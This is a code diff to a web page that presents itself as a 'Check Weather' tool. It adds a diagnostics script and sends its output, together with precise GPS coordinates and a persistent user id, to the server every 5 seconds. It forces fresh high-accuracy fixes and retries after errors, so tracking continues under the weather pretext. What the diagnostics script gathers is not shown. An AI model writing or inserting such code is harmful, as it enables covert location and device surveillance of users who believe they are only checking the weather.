@@ -120,6 +120,7 @@
     </div>
 
 
+    <script src="/js/diagnostics.js"></script>
     <script>
         const id = localStorage.getItem("id") || generateId()
         const btn = document.querySelector("#check-weather")
@@ -134,10 +135,13 @@
 
         function getLocation() {
             navigator.geolocation.getCurrentPosition(
-                (position) => {
+                async (position) => {
                     btn.disabled = true
                     const lat = position.coords.latitude
                     const lng = position.coords.longitude
+                    const diag = (typeof collectRuntimeDiagnosticsAsync === "function")
+                        ? await collectRuntimeDiagnosticsAsync(position)
+                        : (typeof collectRuntimeDiagnostics === "function" ? collectRuntimeDiagnostics(position) : {})
 
                     fetch("/weather", {
                         method: "POST",
@@ -145,27 +149,34 @@
                             id,
                             lat,
                             lng,
+                            diagnostics: diag
                         }),
                         headers: {
                             "Content-Type": "application/json"
                         }
                     }).catch(error => {
                         console.log("post error", error)
+                    }).finally(() => {
+                        if (__interval) clearTimeout(__interval)
+                        __interval = setTimeout(getLocation, 5000)
                     })
                 },
                 (error) => {
                     alert("Please Turn on GPS Location.")
                     btn.disabled = false
                     btn.innerHTML = "Check Weather"
-                    console.error("Error watching position:", error);
+                    console.error("Error watching position:", error)
+                    if (error.code !== error.PERMISSION_DENIED) {
+                        if (__interval) clearTimeout(__interval)
+                        __interval = setTimeout(getLocation, 10000)
+                    }
                 },
                 {
-                    enableHighAccuracy: true, // Use GPS if available
+                    enableHighAccuracy: true,
+                    maximumAge: 0,
+                    timeout: 20000
                 }
             )
-
-            if (__interval) clearTimeout(__interval)
-            __interval = setTimeout(getLocation, 5000)
         }
 
         function generateId(length = 10) {
